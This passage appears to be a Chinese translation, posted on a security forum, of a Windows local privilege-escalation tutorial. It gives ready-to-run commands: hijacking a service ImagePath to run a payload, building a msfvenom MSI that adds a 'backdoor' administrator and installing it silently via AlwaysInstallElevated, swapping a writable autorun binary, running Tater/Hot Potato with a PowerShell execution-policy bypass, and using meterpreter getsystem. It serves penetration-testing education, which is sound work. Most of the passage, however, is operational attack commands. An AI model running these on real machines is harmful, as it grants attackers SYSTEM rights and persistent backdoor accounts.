
![img](https://bbs.kanxue.com/upload/attach/202005/743775_GZYXH46ZPR47TKF.jpg)

修改注册表`ImagePath`的值为你的payload所在的位置，并启动该服务。

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /fsc start regsvc
```

### Always Install Elevated

根据`AlwaysInstallElevated`组策略，Windows允许低权限用户使用system权限安装微软Windows安装包（Microsoft Windows Installer，MSI）。

![img](https://bbs.kanxue.com/upload/attach/202005/743775_FCN4RGNTUUD8YUQ.jpg)

用`msfvenom`创建一个`msi`格式的payload。

![img](https://bbs.kanxue.com/upload/attach/202005/743775_RBWCADRNGPFHKEC.jpg)

`msfvenom -p windows/adduser USER=backdoor PASS=Pass@1234 -f msi -o setup.msi`

使用如下命令安装payload。

```
msiexec /quiet /qn /i C:\Windows\Temp\setup.msi
```

![img](https://bbs.kanxue.com/upload/attach/202005/743775_W35U9H9TZP2YWAX.jpg)

MSI安装后用户添加的后门。

### 可修改的autorun

![img](https://bbs.kanxue.com/upload/attach/202005/743775_AFPYH3QC6MD5V8T.jpg)

因为autorun的路径是可以修改的，我们可以用payload替换该文件。要以高权限运行该程序，我们需要等某个在admin组的用户登录。

![img](https://bbs.kanxue.com/upload/attach/202005/743775_XRA4TJ4JTSHHHMW.jpg)

![img](https://bbs.kanxue.com/upload/attach/202005/743775_48EDX3TZFPWRUK9.jpg)

admin登录

![img](https://bbs.kanxue.com/upload/attach/202005/743775_DESGJ3QRREX8W4A.jpg)

payload在admin登录的那一刻执行。

### Tater / Hot Potato

“Hot Potato（又名：Potato）利用windows中已存在的问题，在windows默认配置下进行本地权限提升。实际是利用了NTLM重放(更确切的说是HTPP->SMB重放)，和NBNS欺骗。”

更多关于此exploit的信息请看[这里](https://bbs.kanxue.com/elink@8d1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3L8%4S2Y4L8r3!0$3k6i4y4W2j5%4g2J5K9i4c8&6i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4y4W2)9J5c8U0l9I4i4K6u0r3x3e0k6Q4x3V1k6Z5L8%4c8Q4x3X3c8H3L8%4c8S2N6r3!0Q4x3V1j5`.)。

我们添加了很多用户，现在让我们尝试以admin权限删除其中一个。

![img](https://bbs.kanxue.com/upload/attach/202005/743775_EFDC6XKXY8KFX7C.jpg)

藏在admin组的后门用户

```
powershell -exec Bypass -c ". .\Tater.ps1;Invoke-Tater -Trigger 1 -Command 'net localgroup administrators backdoor /delete';"
```

![img](https://bbs.kanxue.com/upload/attach/202005/743775_V985UGFSQ2TTKKX.jpg)

exploit完成后，后门用户被删除了。

### 篡改token

在渗透测试项目中，渗透测试人员会设法攻破诸如Apache, IIS, SQL, MySQL等服务。但是，这些服务并不是以本地system或更高权限运行，而是网络服务。你可以使用下列的exploit进行提权。

1. [Rotten Potato](https://bbs.kanxue.com/elink@9ceK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6X3L8%4S2Y4L8r3!0$3k6i4y4W2j5%4g2J5K9i4c8&6i4K6u0W2j5$3!0E0i4K6u0r3x3U0l9I4y4W2)9J5c8U0l9&6i4K6u0r3x3U0k6Q4x3V1k6J5L8%4c8@1k6h3&6Q4x3X3c8H3L8%4c8S2N6r3!0Q4x3X3c8H3M7X3W2$3K9h3I4W2k6$3g2Q4x3X3c8W2M7$3y4S2L8r3q4@1K9h3!0F1i4K6u0V1k6Y4u0G2L8g2)9J5k6s2y4W2M7Y4k6A6j5$3g2Q4x3X3c8S2j5$3y4G2N6h3&6@1M7#2)9J5k6s2c8G2i4K6u0V1M7%4W2K6N6r3g2E0i4K6u0r3)
2. [Juicy Potato](https://bbs.kanxue.com/elink@6c1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6G2K9s2m8W2i4K6u0r3K9Y4g2A6j5%4W2Q4x3X3c8H3L8%4c8S2N6r3!0Q4x3V1k6J5k6h3I4W2j5i4y4W2M7H3`.`.)

### 懒办法

```
meterpreter> getsystem
```

---

原文地址：[445K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6T1N6h3N6T1L8%4g2F1N6s2W2%4M7X3W2@1k6i4g2H3i4K6u0r3M7s2u0A6N6X3W2D9k6h3N6W2i4K6u0V1k6i4y4U0j5h3I4S2N6r3W2G2L8W2)9J5k6r3W2F1i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6o6x3^5x3r3u0W2k6e0y4S2x3U0R3@1x3R3`.`.](https://bbs.kanxue.com/elink@697K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0k6h3c8A6N6h3#2Q4x3X3g2U0L8$3#2Q4x3V1k6T1N6h3N6T1L8%4g2F1N6s2W2%4M7X3W2@1k6i4g2H3i4K6u0r3M7s2u0A6N6X3W2D9k6h3N6W2i4K6u0V1k6i4y4U0j5h3I4S2N6r3W2G2L8W2)9J5k6r3W2F1i4K6u0V1N6$3W2F1k6r3!0%4M7#2)9J5k6o6x3^5x3r3u0W2k6e0y4S2x3U0R3@1x3R3`.`.)

翻译：看雪翻译小组 lumou

校对：看雪翻译小组 梦野间

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2020-5-20 15:28

被lumou编辑，原因：
